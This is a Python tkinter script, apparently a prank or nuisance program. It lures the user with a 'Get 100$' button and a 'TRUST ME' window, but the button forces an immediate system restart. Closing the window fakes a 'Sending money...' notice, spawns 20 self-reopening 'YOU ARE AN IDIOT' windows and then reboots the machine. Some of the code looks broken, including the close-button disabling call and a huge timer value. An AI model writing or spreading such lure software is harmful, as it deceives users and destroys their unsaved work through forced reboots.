import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import threading
import ctypes

def disable_close_button(window):
    h_wnd = ctypes.windll.user32.GetParent(window.winfo_id())
    ctypes.windll.user32.SendMessageW(h_wnd, 0x80C, 0, 0)

def show_idiot_window():
    def on_close():
        show_idiot_window()

    window = tk.Tk()
    window.title("Warning")
    window.geometry("400x200")
    window.configure(bg="red")
    label = tk.Label(window, text="YOU ARE AN IDIOT", font=("Arial", 36), fg="white", bg="red")
    label.pack(padx=20, pady=20)
    disable_close_button(window)
    window.protocol("WM_DELETE_WINDOW", on_close)
    window.after(30008579820000, window.destroy)
    window.mainloop()

def open_multiple_windows():
    num_windows = 20
    threads = []
    for _ in range(num_windows):
        thread = threading.Thread(target=show_idiot_window)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def restart_computer():
    if os.name == "nt":
        subprocess.call(["shutdown", "/r", "/t", "0"])
    elif os.name == "posix":
        subprocess.call(["sudo", "reboot"])

def main():
    def restart_on_close():
        messagebox.showinfo("Sending money...", "Sending money...")
        open_multiple_windows()
        restart_computer()

    root = tk.Tk()
    root.title("Money")
    root.geometry("300x150")
    root.protocol("WM_DELETE_WINDOW", restart_on_close)

    message_label = tk.Label(root, text="TRUST ME", font=("Arial", 14), padx=10, pady=10)
    message_label.pack()

    restart_button = tk.Button(root, text="Get 100$", command=restart_computer)
    restart_button.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    main()
